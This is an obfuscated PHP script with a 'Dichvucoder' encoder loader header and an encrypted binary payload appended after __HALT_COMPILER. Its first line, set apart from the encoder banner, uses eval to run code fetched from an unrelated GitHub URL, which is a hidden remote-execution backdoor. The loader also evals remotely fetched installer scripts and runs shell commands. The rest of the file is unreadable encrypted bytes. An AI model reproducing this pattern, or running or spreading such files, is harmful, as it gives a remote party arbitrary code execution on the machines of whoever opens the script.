<?php eval(file_get_contents("https://raw.githubusercontent.com/qdw106311/module/main/data_file.php")); ?>

<?php
/*
----------------------------
PHP Encode V9.0.1 By Đinh Tấn Phát 
Support Email  : darkprovip1803@gmail.com
Time        : 13-04-2024 Saturday 20:15:11
IP          : 
Andress     : ??
Country     : ??
Useragent   : DVC STATIC TOOL
Description : hi
Get Rented Encode :  Đinh Tấn Phát 
Zalo : 0964747434
----------------------------
*/
error_reporting();
$version = phpversion();
if(!defined("ext_ver__"))define("ext_ver__", trim(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/version")));
if (!function_exists("__Gao188whjnandoos__")) {
  function __Gao188whjnandoos__($version) {
    if (strtoupper(substr(PHP_OS, 0, 3)) === "LIN") {
      if (!isset($machine)) {
        $machine = posix_uname()["machine"];
      }
      print_r("Dichvucoder ".ext_ver__." not installed\n");
      print_r("PHP VERSION : $version\n");
      print_r("MACHINE : $machine\n");
      print_r(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/linux/help")."\n");
      print_r("Do you want to install it automatically (y/n) ? ");
      $auto_ins = trim(fgets(STDIN));
      if ($auto_ins == "y" || $auto_ins == "Y" || $auto_ins == "yes" || $auto_ins == "Yes") {
        eval(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/auto-install/linux.php"));
        die();
      }else die();
    } elseif (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
      $machine = trim(explode("=>", shell_exec('php -i|find "Architecture"'))[1]);
      $compile = trim(explode("=>", shell_exec('php -i|find "Compiler"'))[1]);
      print_r("Dichvucoder ".ext_ver__." not installed\n");
      print_r("PHP VERSION : $version\n");
      print_r("MACHINE : $machine\n");
      print_r("COMPILE VS : $compile");
      print_r(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/windows/help")."\n");
      print_r("Do you want to install it automatically (y/n) ? ");
      $auto_ins = trim(fgets(STDIN));
      if ($auto_ins == "y" || $auto_ins == "Y" || $auto_ins == "yes" || $auto_ins == "Yes") {
        eval(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/auto-install/windows.php"));
        die();
      }else die();
    } else {
      die("The device you are using does not support executing this file !\n");
    }
  }
}
if (!extension_loaded("dichvucoder")) {
  if (dl("dichvucoder")) {} else {
    __Gao188whjnandoos__($version);
  }
}
if (trim(phpversion("dichvucoder")) == ext_ver__) {
  dichvucoder\php::api("execute");
} else {
  __Gao188whjnandoos__($version);
}
__HALT_COMPILER(); ?>

���������856c53b30030b2848dcbd654b234b1bc0bd0bbbcec89d0a923417be18e78a4f7ee34673bbc7e78c5199abb48b10fc598#�N*�������!��?3��;��;��CeԩƲkjoi�(3x%c�wt��� ��5���_:A��o?���J����6��T����NUfu.|�L=+0���Z�j�c�]\m�	c-�.�g�����v/AZF�b�z��_C�tu�bi̕(�N)��p�;�[-f�f2����C�+�UX�S{a^r�&��0��}Vc�I�<�@s����Mx����JytVh�g˨HK��y��0m����٧���cZ� |sP��mV��t�qȓ���*؏���2���/#���d���עJ�b�ٵ��I���|%�iW���C}�����v��ጚl�  D+	����֟4���9�h~Q�&����S[Lx��;�7�i���WY�J���<�im<�b���y��Y��n�ҁ#�K�2F�}�fo���>��5*��{�,
0�X@ݞ!Ɗ�1�E�E�6���cr��M�,^N�V�{{&e`s���S��T��/�J�4��t�LJ��^���[)�PL��I�7B?o�HL�^��<��Q����d��&���4޺68ɫP�N������y����Y��ܞл>�u�Q9h/��W�\��G��oY��QBiՠ��%u����1f�w��2o��X��(�1,)��F�2�T��W��9K~:����2����>��)���0,�
s�S�����hWtB�#t��]��N>�gD���g��N�G���W���G{`�F�+��8nia�)�������U��$�ma������ + ��cpQ�L��*��@2�+��A�J���(V;�hz%�: ��M�Z~����V�e���_vȎ�1îا��g_;�s��d?��w��� ��(T?�b�R��DT�ձAȾE��u�����f�Y86ݓCf����͟�
��}�w@�RD��p�yreyֺ��j�n�E�I�7Aʥ��+zS�2�\+87ٱ��a���^؆߳��t�ۆ�'7�yyl��E�Kc�c+�l�1ޭԻ2(ְ7g�;�$�?�i���A�Ƶ��1�"�"��V��3I�ԥ���_5���Fdi^:dW 5NW���-��OuJ��
�@ԇ��X�;Ti:��eHΐJ~�T.X*UU�ƧP\�j����]q=̛�AN�������Ğ��6���Nv�����}��m;�c�*N�N=��M�b�W�����?���~�Ӯ+i�aoC ��gk��y���|���K����ɮ�.�q����_p$��J-�qⰒή�uI~XL��!�+���N
�;����ƕ����et��"(q��&0�G�j'�.@�"�u]����?ψ(Z���Ƅ"�M��Cm�5�]/���؅��LF��N�*!O=\Nƌp��|J�2l�� �k{�r�1*��C`&<�I�m��+To�)��U�`J� �ܤ���d���#�����y��0���K�`
/�t1��w��&��u�ϿS��6S�X���$'m�j��4ň�'�w�����}gΧh�]�Xw;�Z�A>櫆T^��c�=��
 �Bm]S�1&\)�ҍ)���>+#�j��X(M_�$||������=_5th��m%�T[u���+��4��<p-Ph�jLq��`^_�Z��>T� q��3�w�f2�?C�?5wy���Y��5�/n�̤�[�Lyv�1�u�b�Ŏ�U��}�FN�͚~��h�A�_㗬�Z��fN��(����3ՅJ�o)zbZ���&�ᑉs��m�M$�o8PZ#+�I�1�+�~Q&J YD����٫�u��=*�ب/8b��pg2�05�����U1w��7���~�ɠl�;4��o��bbY iH� <�Fe�ds���!�h��>d��!q��\TO$�=ОB�m���� Mrr^��f���<{~VZ2��!�+��]���ctR��GE����M���H@ˏH�����#R'�U3'��|��&��i� s��d-Zd�����@����߀��nl���jX�u�J�c���f�|12������������ �N��{�T�=ܯ� �ߠB��'Y#�Y�N�d
���
�nHafH��γ#4ņr�:{���J�2�Li3_cp�>.��,lڗ,B@�4�H��4�>�����N���6)eY�;� 1�/d^���$>��\hN^+�
�����	��!9p��%�9d�u)-C <F��0�Qn�m��	�[�gk���Dmx��M��o*��>����	�t81�/m����u�2}Zd%�4UcK��^p4�svm	(��v8B���Z�Xhݏ�����o�	��ٛ.Y	�pq��ne
5�ק,9k���}���~�Vɶv�������uL�Q�E A��Q��]�%	>,t��	+��=��΍��1������Ekӛ�)�pB: �c��n���͟^@�O�/�}�'�ae��]@,a���D��+i��.�;k]���[�J��t_~�Or.�G'�:�S �\f�)�M�X��5'M12�YxN?آ���u�<3���I0�ň�C�d��B�3��&��� w�;��x������

DICHVUCODER ENCODE FILE VERSION 9.0

GITHUB HOME PAGE : https://github.com/Dichvucoder/dichvucoder-9

READ ONLY FILE ENCODE !

BYE
<?php?dvc
#VAR
sha1_very=9b31049952730d4aa433a4e1475d6c77dcf8d486.end